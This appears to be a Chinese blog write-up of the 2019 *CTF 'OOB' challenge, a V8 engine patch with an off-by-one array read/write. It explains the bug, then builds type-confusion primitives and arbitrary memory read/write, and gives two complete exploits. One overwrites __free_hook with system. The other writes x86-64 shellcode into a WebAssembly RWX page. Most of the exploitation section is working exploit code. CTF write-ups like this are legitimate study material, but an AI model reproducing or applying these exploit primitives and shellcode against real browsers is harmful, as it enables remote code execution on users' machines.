@@ -1,0 +1,702 @@
+---
+title: "2019 *CTF Pwn OOB"
+date: "2024-07-30 00:22:36 +0800"
+categories:
+  - "CTF 与 Pwn"
+tags:
+  - "PWN"
+  - "浏览器"
+  - "CTF"
+  - "Docker"
+series: "CTF Writeup"
+excerpt: "如果把 B 的类型改成 A 的类型，那么再访问 B[0] 得到的就不再是对象元素 B[0]，而是把 B[0] 对象元素转换成浮点数的结果，即 B[0] 对象的内存地址。用数组元素的内容伪造一个数组对象的内存；泄露数组地址后，得到数组元素内容的地址，利用类型混淆漏洞把它写入浮点数组，再改成对象数组，就得到一个位于元素内容地址处的伪造对象。之后通过修改数组元素内容中的元素并读写这个伪造对象，就实现了任意地址读写。"
+source: "CSDN"
+original_url: "https://blog.csdn.net/llovewuzhengzi/article/details/140606994"
+csdn_article_id: "140606994"
+migrated: true
+---
+
+{% raw %}
+# 参考
+[从一道 CTF 题零基础学 V8 漏洞利用](https://www.freebuf.com/vuls/203721.html)
+[浏览器入门之 starctf-OOB](https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/)
+# 环境搭建
+切换到当时的分支后，安装依赖时提示最高只支持 Ubuntu 18，所以用 docker 搭建环境
+
+```bash
+git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598
+git apply < oob.diff
+# 编译debug版本
+tools/dev/v8gen.py x64.debug
+ninja -C out.gn/x64.debug d8
+# 编译release版本
+tools/dev/v8gen.py x64.release
+ninja -C out.gn/x64.release d8
+```
+
+# 调试
+docker 中
+
+```bash
+ gdbserver localhost:123 ./d8 --allow-natives-syntax ./exp.js
+
+```
+宿主机
+
+```bash
+gdb -ex 'target remote 127.0.0.1:123' ./d8
+
+```
+
+# diff
+
+```cpp
+diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
+index b027d36..ef1002f 100644
+--- a/src/bootstrapper.cc
++++ b/src/bootstrapper.cc
+@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
+                           Builtins::kArrayPrototypeCopyWithin, 2, false);
+     SimpleInstallFunction(isolate_, proto, "fill",
+                           Builtins::kArrayPrototypeFill, 1, false);
++    SimpleInstallFunction(isolate_, proto, "oob",
++                          Builtins::kArrayOob,2,false);
+     SimpleInstallFunction(isolate_, proto, "find",
+                           Builtins::kArrayPrototypeFind, 1, false);
+     SimpleInstallFunction(isolate_, proto, "findIndex",
+diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
+index 8df340e..9b828ab 100644
+--- a/src/builtins/builtins-array.cc
++++ b/src/builtins/builtins-array.cc
+@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
+   return *final_length;
+ }
+ }  // namespace
++BUILTIN(ArrayOob){
++    uint32_t len = args.length();
++    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
++    Handle<JSReceiver> receiver;
++    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
++            isolate, receiver, Object::ToObject(isolate, args.receiver()));
++    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
++    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
++    uint32_t length = static_cast<uint32_t>(array->length()->Number());
++    if(len == 1){
++        //read
++        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
++    }else{
++        //write
++        Handle<Object> value;
++        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
++                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
++        elements.set(length,value->Number());
++        return ReadOnlyRoots(isolate).undefined_value();
++    }
++}
+ 
+ BUILTIN(ArrayPush) {
+   HandleScope scope(isolate);
+diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
+index 0447230..f113a81 100644
+--- a/src/builtins/builtins-definitions.h
++++ b/src/builtins/builtins-definitions.h
+@@ -368,6 +368,7 @@ namespace internal {
+   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
+   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
+   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
++  CPP(ArrayOob)                                                                \
+                                                                                \
+   /* ArrayBuffer */                                                            \
+   /* ES #sec-arraybuffer-constructor */                                        \
+diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
+index ed1e4a5..c199e3a 100644
+--- a/src/compiler/typer.cc
++++ b/src/compiler/typer.cc
+@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
+       return Type::Receiver();
+     case Builtins::kArrayUnshift:
+       return t->cache_->kPositiveSafeInteger;
++    case Builtins::kArrayOob:
++      return Type::Receiver();
+ 
+     // ArrayBuffer functions.
+     case Builtins::kArrayBufferIsView:
+
+```
+这个 diff 文件包含以下主要修改：
+
+1. 在 `bootstrapper.cc` 文件中，为 `JSGlobalObject` 的原型新增了一个内置函数 `ArrayOob`。该函数可以用来读写数组越界的元素。
+
+2. 在 `builtins-array.cc` 文件中，实现了 `ArrayOob` 函数的逻辑。
+		                        
+	
+	1. `BUILTIN(ArrayOob)` 是一个宏定义，用于在 V8 引擎中定义内置函数，这个函数名为 `ArrayOob`。
+	
+	2. 函数第一行获取函数的参数个数，存放在变量 `len` 中。
+	
+	3. 接着进行简单的参数检查：如果参数个数大于 2，直接返回 `undefined`。
+	
+	4. 用 `Object::ToObject` 把函数调用者转换为 `JSReceiver` 对象，再强制转换为 `JSArray` 对象，存放在 `array` 变量中。
+	
+	5. 通过 `array->elements()` 获取数组的底层存储结构 `FixedDoubleArray`，存放在 `elements` 变量中。
+	
+	6. 获取数组的长度，存放在 `length` 变量中。
+	
+	7. 接下来根据参数个数 `len` 判断是读还是写：
+	   - 如果 `len` 等于 1，表示读操作。通过 `elements.get_scalar(length)` 获取数组最后一个元素的值，转换为 `Number` 类型后返回。这里存在 off-by-one 错误，因为数组下标从 0 开始，而这里用 `length` 作为下标，导致读到了数组越界的元素。
+	   - 如果 `len` 等于 2，表示写操作。先把第二个参数转换为 `Number` 类型，存放在 `value` 变量中，然后用 `elements.set(length, value->Number())` 把该值写到数组的最后一个元素。这里同样存在 off-by-one 错误，因为用 `length` 作为下标，导致写入了数组越界的元素。
+
+
+
+4. 在 `builtins-definitions.h` 文件中，新增了 `ArrayOob` 函数的定义，指定其为 C++ 实现。
+
+5. 在 `typer.cc` 文件中，为 `ArrayOob` 函数新增了类型推断逻辑，返回类型为 `Type::Receiver()`。
+
+
+
+
+# 漏洞利用
+
+![图片](./assets/csdn-140606994/image-001-b06ba70a8d.png)
+在 a.oob(1) 的情况下，传入了两个参数：
+
+- 第一个参数是数组 a 本身，即隐式传入的 this 参数。
+- 第二个参数是数字 1。
+
+a.oob(0) 打印出数组越界的 a[4]
+
+
+发现数组对象的 elements 其实也是一个对象。这些 elements 在内存中就分布在数组对象的正上方，即低地址处。也就是说在内存申请上，v8 先申请了一块内存存放元素内容，再申请一块内存存放这个数组的对象结构，对象中的 elements 指针指向存放元素内容的内存地址
+
+```bash
+  elements  ----> +------------------------+
+                   |          MAP           +<---------+
+                   +------------------------+          |
+                   |      element 1         |          |
+                   +------------------------+          |
+                   |      element 2         |          |
+                   |      ......            |          |
+                   |      element n         |          |
+ ArrayObject  ---->-------------------------+          |
+                   |      map               |          |
+                   +------------------------+          |
+                   |      prototype         |          |
+                   +------------------------+          |
+                   |      elements          |          |
+                   |                        +----------+
+                   +------------------------+
+                   |      length            |
+                   +------------------------+
+                   |      properties        |
+                   +------------------------+
+```
+
+所以实际上越界读可以读出 map 的地址，越界写可以修改 map 的地址，即可以修改对象类型 Map（类型混淆）
+比如我们定义一个 FloatArray 浮点数组 A，再定义一个对象数组 B。正常情况下，访问 A[0] 返回的是一个浮点数，访问 B[0] 返回的是一个对象元素。如果把 B 的类型改成 A 的类型，那么再访问 B[0] 得到的就不再是对象元素 B[0]，而是把 B[0] 对象元素转换成浮点数的结果，即 B[0] 对象的内存地址；如果把 A 的类型改成 B 的类型，那么再访问 A[0] 得到的就不再是浮点数 A[0]，而是以 A[0] 为内存地址的一个 JavaScript 对象。
+
+
+> 计算一个对象的地址 addressOf：把需要计算内存地址的对象存放到一个对象数组的 A[0] 中，然后利用上述类型混淆漏洞把对象数组的 Map 类型改为浮点数组类型，再访问 A[0] 就能得到以浮点数表示的目标对象的内存地址。
+
+> 把一个内存地址伪造为一个对象 fakeObject：把需要伪造的内存地址存放到一个浮点数组的 B[0] 中，然后利用上述类型混淆漏洞把浮点数组的 Map 类型改为对象数组类型，那么 B[0] 此时就代表了以这个内存地址为起始地址的一个 JS 对象。
+
+
+```javascript
+var obj = {"a": 1};
+var obj_array = [obj];
+var float_array = [1.1];
+​
+var obj_array_map = obj_array.oob();
+var float_array_map = float_array.oob();
+```
+![图片](./assets/csdn-140606994/image-002-6e764a089d.png)
+
+```javascript
+// 泄露某个object的地址
+function addressOf(obj_to_leak)
+{
+    obj_array[0] = obj_to_leak;
+    obj_array.oob(float_array_map);
+    let obj_addr = f2i(obj_array[0]) - 1n;
+    obj_array.oob(obj_array_map); // 还原array类型以便后续继续使用
+    return obj_addr;
+}
+```
+
+```javascript
+// 将某个addr强制转换为object对象
+function fakeObject(addr_to_fake)
+{
+    float_array[0] = i2f(addr_to_fake + 1n);
+    float_array.oob(obj_array_map);
+    let faked_obj = float_array[0];
+    float_array.oob(float_array_map); // 还原array类型以便后续继续使用
+    return faked_obj;
+}
+```
+
+
+# 任意地址读写
+用数组元素的内容伪造一个数组对象的内存；泄露数组地址后，得到数组元素内容的地址，利用类型混淆漏洞把它写入浮点数组，再改成对象数组，就得到一个位于元素内容地址处的伪造对象。之后通过修改数组元素内容中的元素并读写这个伪造对象，就可以实现任意地址读写
+
+
+由于在数组中伪造 DoubleArray 进行任意读写存在一些棘手的问题
+- 数组在进行元素访问时，会与堆的基址进行掩码运算，确保 elements 指针指向的内存段属于 v8 堆的范围。（通过 FloatArray 的方式写高地址会失败。）
+- 对伪造的浮点数组进行操作时，会触发收集 Inline Cache 的函数，导致 SIGTRAP。
+- 用 DoubleArray 构造的任意地址读写只能读写 elements + 0x10，同时还会访问 [elements, elements + 0x10) 范围内的数据。如果要在 rwx 段写 shellcode，需要从起始位置开始写，所以用 DoubleArray 构造的任意读写无法完成。
+
+## 伪造 ArrayBuffer
+这里需要伪造一个 ArrayBuffer 来构造任意地址读写。
+
+~~我一直以为 job 显示的和实际地址分别是一样的，我真是个菜鸡~~ 
+
+为了让这里伪造的 arraybuffer 能被 dataview 正常解析，arraybuffer 的 map 指向的类型需要是 JS_ARRAY_BUFFER_TYPE
+
+![图片](./assets/csdn-140606994/image-003-8b9d158128.png)
+
+```javascript
+var fake_array_object = [
+    u2d(0n),                    // Map
+    u2d(0n),                    // Propertries
+    u2d(0n),                    // Elements
+    u2d(0x1000n),               // ByteLength
+    u2d(0n),                    // BackingStore
+    u2d(0n),                    // Map
+    u2d(0x1900042319080808n),   // type
+];
+```
+
+![图片](./assets/csdn-140606994/image-004-093b363995.png)
+
+之后还需要修改 fake_array_object [0]（Map），让它指向伪造的 map 字段（下面那个 map）
+
+
+发现 doublearray 中元素的个数会影响 elements 相对于对象位于上方还是下方，这里 7 个元素时在下方，对应元素内容的起始地址 = fake_array_object 的地址 + 0x48 + 0x10
+![图片](./assets/csdn-140606994/image-005-d8cfea7cbf.png)
+
+然后把元素内容的起始地址转换为 arraybuffer 对象，并把 arraybuffer[0] 设置为 fake_array_object 的地址 + 0x48 + 0x10 + 0x28（即 arraybuffer 上下面那个 map 的地址）。之后任意读写时，只需把 arraybuffer[4] 修改为要读或写的地址即可
+
+```javascript
+
+var fake_array_object = [
+    u2d(0n),                    // Map
+    u2d(0n),                    // Propertries
+    u2d(0n),                    // Elements
+    u2d(0x1000n),               // ByteLength
+    u2d(0n),                    // BackingStore
+    u2d(0n),                    // Map
+    u2d(0x1900042319080808n),   // type
+];
+
+fake_array_object_addr=addr_leak(fake_array_object);
+print("fake_array_object_addr "+hex(fake_array_object_addr));
+
+fake_array_object[0]=u2d(fake_array_object_addr+0x48n+0x10n+0x28n); // pay attention u2d 
+ 
+fake_array_object_0_addr=fake_array_object_addr+0x48n+0x10n;
+fake_arraybuf_object=replace_fake_obj(fake_array_object_0_addr);
+
+// //check
+// fake_arraybuf_object_addr=addr_leak(fake_arraybuf_object)
+// print("fake_arraybuf_object_addr "+hex(fake_arraybuf_object_addr))
+// print("fake_array_object_0_addr "+hex(fake_array_object_0_addr))
+ 
+
+var dv = new DataView(fake_arraybuf_object);
+function any_addr_read(read_addr)
+{
+    fake_array_object[4]=u2d(read_addr);
+    return dv.getBigUint64(0, true); //little-endian
+}
+function any_addr_write(write_addr,value)
+{
+    fake_array_object[4]=u2d(write_addr);
+    return dv.setBigUint64(0, value, true); //little-endian
+}
+```
+
+## 伪造 double array 修改 ArrayBuffer 的 BackingStore 
+伪造一个 DoubleArray 进行任意地址写，把一个 ArrayBuffer 的 BackingStore 修改为指向另一个 ArrayBuffer 的 BackingStore。之后每次任意地址读写时，都可以先用一个 ArrayBuffer 修改另一个 ArrayBuffer 的 BackingStore，再用另一个 ArrayBuffer 进行任意地址读写。（或者直接把一个 ArrayBuffer 的 BackingStore 改为指向要写的地址，再通过 dataview 写入）
+
+![图片](./assets/csdn-140606994/image-006-d9f34b97fa.png)
+fake_float_array 对象的起始地址 = float_array_mem 对象的地址 + 0x20 + 0x10，此时 fake_float_array 对象及其对应的 elements 已被设置为某个 arraybuffer 的 backing store 字段位置减 0x10，然后通过 fake_float_array[0] 把一个 arraybuffer 的 backing store 字段的值修改为另一个 arraybuffer 的 backing store 字段位置减 0x10
+- 任意读：先把第一个 arraybuffer 的 backing store 对应的值（即第二个 arraybuffer 的 backing store 字段值）设置为要读的地址，再取第二个 arraybuffer 的 backing store 字段对应的值
+- 任意写：先把第一个 arraybuffer 的 backing store 对应的值（即第二个 arraybuffer 的 backing store 字段值）设置为要写的地址，再给第二个 arraybuffer 的 backing store 字段对应的值赋值
+
+```javascript
+var ab1 = new ArrayBuffer(0x8);
+var ab2 = new ArrayBuffer(0x1000);
+var dv1 = new DataView(ab1);
+var dv2 = new DataView(ab2);
+var ab1_bs_addr = addr_leak(ab1) + 0x20n;
+var ab2_bs_addr = addr_leak(ab2) + 0x20n;
+
+var float_array_mem = [
+    float_mmap,
+    0,
+    u2d(ab1_bs_addr - 0x10n),
+    u2d(0x100000000n),
+
+];
+
+fake_float_array = fakeObj(addressOf(float_array_mem) + 0x30n);
+fake_float_array[0] = u2d(ab2_bs_addr - 1n);
+
+
+function arbitrary_address_read(address) {
+    dv1.setBigUint64(0, address, true);
+    return dv2.getBigUint64(0, true);
+}
+
+function arbitrary_address_write(address, value) {
+    dv1.setBigUint64(0, address, true);
+    return dv2.setBigUint64(0, value, true);
+}
+
+```
+
+# 漏洞利用
+##  传统方法
+通过 Array 等构造函数可以泄露 ELF 的加载基址，再通过 GOT 表泄露 libc 的加载基址。
+
+> 查看 Array 对象结构 --> 查看对象的 Map 属性 --> 查看 Map 中指定的 constructor 结构 --> 查看 code 属性 --> 在 code 内存地址的固定偏移处存放着 v8 二进制中的指令地址
+
+> v8 在生成一个数组对象时，会相应地生成一个 code 对象。这个 code 对象存放着与该数组对象相关的构造函数指令，而这些构造函数指令又会调用 d8 二进制中的指令地址来完成数组对象的构造。
+
+> 注意这里必须用 release 版本来查看，否则 debug 版本不会显示 PIE 相关的地址
+![图片](./assets/csdn-140606994/image-007-0f6e9bb4a4.png)
+
+
+利用任意地址写把 __free_hook 修改为 system 函数的地址
+
+> 此时建议把 %SystemBreak() 断点设在 any_addr_write 内部或写 free_hook 之前，因为 v8 运行时有很多内存释放和垃圾回收操作，这些操作很容易触发 free 函数。因此在上面 any_addr_write 结束后调用的 %SystemBreak 之前，就很容易触发一次 free 操作，导致 gdb 崩溃
+
+然后，由于 v8 运行时有很多内存释放和垃圾回收操作，这些操作很容易触发 free 函数，可以申请一个局部的 buffer 变量，往里面写入命令，然后释放它，从而触发 free 操作；或者 print 命令也能触发
+
+getshell 的演示需要直接在 d8 的非调试模式下运行才能看到效果。把脚本中的 %DebugPrint 和 %SystemBreak 等原生调试函数去掉，直接运行 d8 调用最终的 js 文件
+### exp
+
+```javascript
+let array_buffer = new ArrayBuffer(0x8);
+let data_view = new DataView(array_buffer);
+
+function d2u(value) {
+    data_view.setFloat64(0, value);
+    return data_view.getBigUint64(0);
+}
+
+function u2d(value) {
+    data_view.setBigUint64(0, value);
+    return data_view.getFloat64(0);
+}
+
+function hex(val) {
+    return '0x' + val.toString(16).padStart(16, "0");
+}
+// number to string hex and pad 0 to 16
+
+
+var obj={};
+var float_array=[1.1];
+var object_array=[obj];
+var float_mmap=float_array.oob();
+var object_mmap=object_array.oob();
+// type confusion
+function addr_leak(obj)
+{
+   float_array.oob(object_mmap);
+   float_array[0]=obj;
+   float_array.oob(float_mmap);
+   var leak_obj_addr=float_array[0];
+   return d2u(leak_obj_addr);
+}
+//leak object addr
+function replace_fake_obj(fake_obj_addr)
+{
+    object_array.oob(float_mmap);
+    object_array[0]=u2d(fake_obj_addr|1n);
+    object_array.oob(object_mmap);
+    var fake_obj=object_array[0];
+    return fake_obj;
+}
+//get the object by object addr
+
+var fake_array_object = [
+    u2d(0n),                    // Map
+    u2d(0n),                    // Propertries
+    u2d(0n),                    // Elements
+    u2d(0x1000n),               // ByteLength
+    u2d(0n),                    // BackingStore
+    u2d(0n),                    // Map
+    u2d(0x1900042319080808n),   // type
+];
+
+fake_array_object_addr=addr_leak(fake_array_object);
+print("fake_array_object_addr "+hex(fake_array_object_addr));
+
+fake_array_object[0]=u2d(fake_array_object_addr+0x48n+0x10n+0x28n); // pay attention u2d 
+ 
+fake_array_object_0_addr=fake_array_object_addr+0x48n+0x10n;
+fake_arraybuf_object=replace_fake_obj(fake_array_object_0_addr);
+
+// //check
+// fake_arraybuf_object_addr=addr_leak(fake_arraybuf_object)
+// print("fake_arraybuf_object_addr "+hex(fake_arraybuf_object_addr))
+// print("fake_array_object_0_addr "+hex(fake_array_object_0_addr))
+ 
+
+var dv = new DataView(fake_arraybuf_object);
+function any_addr_read(read_addr)
+{
+    fake_array_object[4]=u2d(read_addr);
+    return dv.getBigUint64(0, true); //little-endian
+}
+function any_addr_write(write_addr,value)
+{
+    fake_array_object[4]=u2d(write_addr);
+    return dv.setBigUint64(0, value, true); //little-endian
+}
+function get_shell()
+{
+    let get_shell_buffer = new ArrayBuffer(0x1000);
+    let get_shell_dataview = new DataView(get_shell_buffer);
+    get_shell_dataview.setFloat64(0, u2d(0x0068732f6e69622fn)); // str --> /bin/sh\x00 
+}
+
+
+//leak pie
+var a = [1.1, 2.2, 3.3];
+code_addr=addr_leak(a.constructor)+0x30n;
+print("code_addr "+hex(code_addr));
+code_obj_addr=any_addr_read(code_addr-1n)-1n;
+print("code_obj_addr "+hex(code_obj_addr));
+pie_addr=any_addr_read(code_obj_addr+0x42n)-0xf91780n;
+print("pie_addr "+hex(pie_addr));
+
+//leak libc
+libc_addr=any_addr_read(0x1273ef8n+pie_addr)-0x45130n;
+print("libc_addr "+hex(libc_addr));
+
+free_hook=libc_addr+0x3ed8e8n
+system=libc_addr+0x4f420n
+any_addr_write(free_hook,system)
+
+//get_shell();
+
+print("/snap/bin/gnome-calculator");
+
+```
+
+![图片](./assets/csdn-140606994/image-008-277b1016e6.png)
+
+## wasm
+[WebAssembly 实践：如何写代码](https://github.com/Hanks10100/wasm-examples/blob/master/how_to_code.md)
+[WASM 官方文档](https://webassembly.org/getting-started/developers-guide/#compile-and-run-a-simple-program)
+
+wasm 是一种让 JavaScript 能直接执行由高级语言生成的机器码的技术。
+```javascript
+var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+​
+var wasmModule = new WebAssembly.Module(wasmCode);
+var wasmInstance = new WebAssembly.Instance(wasmModule, {});
+var f = wasmInstance.exports.main;
+​
+var d = f();
+console.log("[*] return from wasm: " + d);
+%SystemBreak();
+```
+出于安全考虑，wasm 同样不允许通过浏览器直接调用系统函数。wasm 中只能运行数学计算、图像处理等与系统无关的高级语言代码。
+
+我们可以结合漏洞，把内存中原本的 wasm 代码替换为 shellcode，之后调用 wasm 接口时，实际调用的就是我们的 shellcode。
+
+- 首先把一段 wasm 代码加载到内存中（利用 WebAssembly 创建一个 rwx 段。）
+
+```javascript
+var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasmModule = new WebAssembly.Module(wasmCode);
+var wasmInstance = new WebAssembly.Instance(wasmModule);
+var f = wasmInstance.exports.main;
+var d = f();
+console.log("[*] return from wasm: " + d);
+```
+
+- 然后用 addresssOf 原语找到存放 wasm 的内存地址
+
+   Function-->shared_info-->WasmExportedFunctionData-->instance。在 instance+0x88 的固定偏移处，可以读到存放 wasm 代码的内存页的起始地址（即 `var wasmInstance = new WebAssembly.Instance(wasmModule, {});` 中的 wasmInstance）![图片](./assets/csdn-140606994/image-009-9a4de883ad.png)
+   
+
+```javascript
+var wasm_addr=any_addr_read(addr_leak(wasmInstance)-1n+0x88n);
+```
+
+- 接着用任意地址写原语把原本的 wasm 代码内容替换为 shellcode
+
+```javascript
+var shellcode = [
+    0x9090909090909090n,    //nop 
+    0x636c6163782fb848n,
+    0x73752fb848500000n,
+    0x8948506e69622f72n,
+    0x89485750c03148e7n,
+    0x3ac0c748d23148e6n,
+    0x4944b84850000030n,
+    0x48503d59414c5053n,
+    0x485250c03148e289n,
+    0x00003bc0c748e289n,
+    0x0000000000050f00n
+];
+
+//var shellcode = [
+//     0x636c6163782fb848n,
+//     0x73752fb848500000n,
+//     0x8948506e69622f72n,
+//     0x89485750c03148e7n,
+//     0x3ac0c748d23148e6n,
+//     0x4944b84850000030n,
+//     0x48503d59414c5053n,
+//     0x485250c03148e289n,
+//     0x00003bc0c748e289n,
+//     0x0000000000050f00n
+// ]
+
+
+for (let i = 0; i < shellcode.length; i++) {
+    any_addr_write(wasm_addr + BigInt(i) * 8n, shellcode[i]);
+}
+```
+
+- 最后调用 wasm 函数接口，即可触发对 shellcode 的调用
+
+```javascript
+var d = f();
+```
+### exp
+
+```javascript
+let array_buffer = new ArrayBuffer(0x8);
+let data_view = new DataView(array_buffer);
+
+function d2u(value) {
+    data_view.setFloat64(0, value);
+    return data_view.getBigUint64(0);
+}
+
+function u2d(value) {
+    data_view.setBigUint64(0, value);
+    return data_view.getFloat64(0);
+}
+
+function hex(val) {
+    return '0x' + val.toString(16).padStart(16, "0");
+}
+// number to string hex and pad 0 to 16
+
+
+var obj={};
+var float_array=[1.1];
+var object_array=[obj];
+var float_mmap=float_array.oob();
+var object_mmap=object_array.oob();
+// type confusion
+function addr_leak(obj)
+{
+   float_array.oob(object_mmap);
+   float_array[0]=obj;
+   float_array.oob(float_mmap);
+   var leak_obj_addr=float_array[0];
+   return d2u(leak_obj_addr);
+}
+//leak object addr
+function replace_fake_obj(fake_obj_addr)
+{
+    object_array.oob(float_mmap);
+    object_array[0]=u2d(fake_obj_addr|1n);
+    object_array.oob(object_mmap);
+    var fake_obj=object_array[0];
+    return fake_obj;
+}
+//get the object by object addr
+
+var fake_array_object = [
+    u2d(0n),                    // Map
+    u2d(0n),                    // Propertries
+    u2d(0n),                    // Elements
+    u2d(0x1000n),               // ByteLength
+    u2d(0n),                    // BackingStore
+    u2d(0n),                    // Map
+    u2d(0x1900042319080808n),   // type
+];
+
+fake_array_object_addr=addr_leak(fake_array_object);
+print("fake_array_object_addr "+hex(fake_array_object_addr));
+
+fake_array_object[0]=u2d(fake_array_object_addr+0x48n+0x10n+0x28n); // pay attention u2d 
+ 
+fake_array_object_0_addr=fake_array_object_addr+0x48n+0x10n;
+fake_arraybuf_object=replace_fake_obj(fake_array_object_0_addr);
+
+// //check
+// fake_arraybuf_object_addr=addr_leak(fake_arraybuf_object)
+// print("fake_arraybuf_object_addr "+hex(fake_arraybuf_object_addr))
+// print("fake_array_object_0_addr "+hex(fake_array_object_0_addr))
+ 
+
+var dv = new DataView(fake_arraybuf_object);
+function any_addr_read(read_addr)
+{
+    fake_array_object[4]=u2d(read_addr);
+    return dv.getBigUint64(0, true); //little-endian
+}
+function any_addr_write(write_addr,value)
+{
+    fake_array_object[4]=u2d(write_addr);
+    return dv.setBigUint64(0, value, true); //little-endian
+}
+
+
+var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasmModule = new WebAssembly.Module(wasmCode);
+var wasmInstance = new WebAssembly.Instance(wasmModule);
+var f = wasmInstance.exports.main;
+var d = f();
+console.log("[*] return from wasm: " + d);
+
+var wasm_addr=any_addr_read(addr_leak(wasmInstance)-1n+0x88n);
+var shellcode = [
+    0x9090909090909090n,    //nop 
+    0x636c6163782fb848n,
+    0x73752fb848500000n,
+    0x8948506e69622f72n,
+    0x89485750c03148e7n,
+    0x3ac0c748d23148e6n,
+    0x4944b84850000030n,
+    0x48503d59414c5053n,
+    0x485250c03148e289n,
+    0x00003bc0c748e289n,
+    0x0000000000050f00n
+];
+
+//var shellcode = [
+//     0x636c6163782fb848n,
+//     0x73752fb848500000n,
+//     0x8948506e69622f72n,
+//     0x89485750c03148e7n,
+//     0x3ac0c748d23148e6n,
+//     0x4944b84850000030n,
+//     0x48503d59414c5053n,
+//     0x485250c03148e289n,
+//     0x00003bc0c748e289n,
+//     0x0000000000050f00n
+// ]
+
+
+for (let i = 0; i < shellcode.length; i++) {
+    any_addr_write(wasm_addr + BigInt(i) * 8n, shellcode[i]);
+}
+
+var d = f();
+console.log("[*] return from wasm: " + d);
+
+```
+
+![图片](./assets/csdn-140606994/image-010-2de3dac658.png)
+{% endraw %}
